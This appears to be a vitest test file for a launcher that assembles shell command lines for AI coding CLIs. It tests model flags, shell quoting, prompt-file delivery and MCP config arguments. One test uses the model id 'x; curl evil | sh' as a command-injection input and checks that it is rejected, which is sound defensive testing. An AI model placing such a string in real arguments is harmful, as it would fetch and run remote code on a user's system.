import { describe, expect, it } from 'vitest';

import {
  BUILTIN_AGENTS,
  buildProfileLaunchLine,
  composeProfilePrompt,
  enforcementFor,
  loopModelArgs,
  profileMcpArgs,
  profileModelArgs,
  shellWord,
  promptDeliveryFor,
} from './index';

const agent = (id: string) => {
  const found = BUILTIN_AGENTS.find((a) => a.id === id);
  if (!found) throw new Error(`no builtin ${id}`);
  return found;
};

describe('profileModelArgs', () => {
  it('adds nothing for default', () => {
    expect(profileModelArgs('claude', 'default')).toEqual([]);
  });
  it('maps a Claude loop id like a loop does', () => {
    expect(profileModelArgs('claude', 'sonnet-5-5')).toEqual(loopModelArgs('claude', 'sonnet-5-5'));
    expect(profileModelArgs('claude', 'sonnet-5-5')).not.toEqual([]);
  });
  it('resolves another CLI through its model list', () => {
    expect(profileModelArgs('agy', 'gemini-4-argon-low')).toEqual(['--model', 'gemini-4-argon-low']);
  });
  it('adds no flag for a model id the base CLI does not list — an imported file can carry anything', () => {
    expect(profileModelArgs('codex', 'x; curl evil | sh')).toEqual([]);
    expect(profileModelArgs('agy', 'not-a-model')).toEqual([]);
    const line = buildProfileLaunchLine({ base: BUILTIN_AGENTS.find((a) => a.id === 'codex')!, model: 'x; curl evil | sh', promptPath: null, delivery: 'argument', mcpArgs: [], resume: false });
    expect(line).not.toContain('curl');
  });
});

describe('shellWord', () => {
  it('leaves a safe word bare and quotes anything else exactly, whitespace included', () => {
    expect(shellWord('--model')).toBe('--model');
    expect(shellWord('a  b')).toBe("'a  b'");
    expect(shellWord("it's")).toBe(String.raw`'it'\''s'`);
  });
});

describe('delivery and enforcement', () => {
  it('tables', () => {
    expect(promptDeliveryFor('claude')).toBe('flag');
    expect(promptDeliveryFor('codex')).toBe('argument');
    expect(promptDeliveryFor('aider')).toBe('none');
    expect(promptDeliveryFor('mystery')).toBe('none');
    expect(enforcementFor('claude')).toEqual({ tools: true, toolCallLimit: true });
    expect(enforcementFor('codex')).toEqual({ tools: true, toolCallLimit: true });
    expect(enforcementFor('aider')).toEqual({ tools: false, toolCallLimit: false });
  });
});

describe('composeProfilePrompt', () => {
  it('composes with and without skills', () => {
    expect(composeProfilePrompt({ systemPrompt: '  Be terse.  ', skills: [] })).toBe('Be terse.');
    expect(composeProfilePrompt({ systemPrompt: 'Be terse.', skills: ['a', 'b'] })).toBe(
      'Be terse.\n\nPrefer these skills when they fit: a, b.',
    );
    expect(composeProfilePrompt({ systemPrompt: '', skills: ['a'] })).toBe('Prefer these skills when they fit: a.');
    expect(composeProfilePrompt({ systemPrompt: ' ', skills: [] })).toBe('');
  });
});

describe('buildProfileLaunchLine', () => {
  const claude = agent('claude');
  it('ends a flag line with the quoted prompt file, one word even with a space', () => {
    const line = buildProfileLaunchLine({ base: claude, model: 'default', promptPath: '/a b/p.md', delivery: 'flag', mcpArgs: [], resume: false });
    expect(line).toBe(`${[claude.command, ...claude.args].join(' ')} --append-system-prompt-file '/a b/p.md'`);
    expect(line.endsWith("--append-system-prompt-file '/a b/p.md'")).toBe(true);
  });

  it('ends an argument line with $(cat file) and drops it on resume', () => {
    const codex = agent('codex');
    const line = buildProfileLaunchLine({ base: codex, model: 'default', promptPath: '/p.md', delivery: 'argument', mcpArgs: [], resume: false });
    expect(line.endsWith(`"$(cat '/p.md')"`)).toBe(true);
    const resumed = buildProfileLaunchLine({ base: codex, model: 'default', promptPath: '/p.md', delivery: 'argument', mcpArgs: [], resume: true });
    expect(resumed).not.toContain('$(cat');
  });

  it('carries a first prompt as the last word, joined into the prompt file for argument delivery', () => {
    const flag = buildProfileLaunchLine({ base: claude, model: 'default', promptPath: '/p.md', delivery: 'flag', mcpArgs: [], resume: false, prompt: "fix it's bug" });
    expect(flag.endsWith(String.raw`--append-system-prompt-file '/p.md' 'fix it'\''s bug'`)).toBe(true);
    const bare = buildProfileLaunchLine({ base: claude, model: 'default', promptPath: null, delivery: 'flag', mcpArgs: [], resume: false, prompt: 'go' });
    expect(bare.endsWith(" 'go'")).toBe(true);
    const codex = agent('codex');
    const arg = buildProfileLaunchLine({ base: codex, model: 'default', promptPath: '/p.md', delivery: 'argument', mcpArgs: [], resume: false, prompt: 'go' });
    expect(arg.endsWith(String.raw`"$(cat '/p.md'; printf '\n\n%s' 'go')"`)).toBe(true);
    expect(arg.match(/\$\(cat/g)).toHaveLength(1);
  });

  it('adds base.resume and places mcpArgs before the prompt words', () => {
    const base = { ...claude, resume: ['--continue'] };
    const line = buildProfileLaunchLine({ base, model: 'default', promptPath: '/p.md', delivery: 'flag', mcpArgs: ['--mcp-config', 'x'], resume: true });
    expect(line).toContain('--continue');
    expect(line.indexOf('--mcp-config')).toBeLessThan(line.indexOf('--append-system-prompt-file'));
    expect(line.endsWith('\r')).toBe(false);
  });

  it('adds no prompt words for none or a null path', () => {
    expect(buildProfileLaunchLine({ base: claude, model: 'default', promptPath: null, delivery: 'flag', mcpArgs: [], resume: false })).not.toContain('append');
    expect(buildProfileLaunchLine({ base: agent('aider'), model: 'default', promptPath: '/p.md', delivery: 'none', mcpArgs: [], resume: false })).not.toContain('/p.md');
  });
});

describe('profileMcpArgs (Phase 154 Theme G)', () => {
  const launch = { command: '/App/Midnite Studio', args: ['/shim.js', '--socket', '/s/p-1.sock'], env: { ELECTRON_RUN_AS_NODE: '1' } };

  it('Claude: a midnite --mcp-config, strict only when restricted; quoted for a typed line, raw for an argv', () => {
    const typed = profileMcpArgs('claude', launch, { restricted: true, quote: true });
    expect(typed).toEqual([
      '--mcp-config',
      `'${JSON.stringify({ mcpServers: { midnite: launch } })}'`,
      '--strict-mcp-config',
    ]);
    expect(profileMcpArgs('claude', launch, { restricted: false, quote: false })).toEqual([
      '--mcp-config',
      JSON.stringify({ mcpServers: { midnite: launch } }),
    ]);
  });

  it('Codex: command, args and env, all three, so nothing of a global midnite entry redirects the socket', () => {
    expect(profileMcpArgs('codex', launch, { restricted: true, quote: false })).toEqual([
      '-c',
      'mcp_servers.midnite.command="/App/Midnite Studio"',
      '-c',
      'mcp_servers.midnite.args=["/shim.js", "--socket", "/s/p-1.sock"]',
      '-c',
      'mcp_servers.midnite.env={ ELECTRON_RUN_AS_NODE = "1" }',
    ]);
  });

  it('nothing for a CLI with no per-launch MCP config', () => {
    expect(profileMcpArgs('aider', launch, { restricted: true, quote: true })).toEqual([]);
  });
});
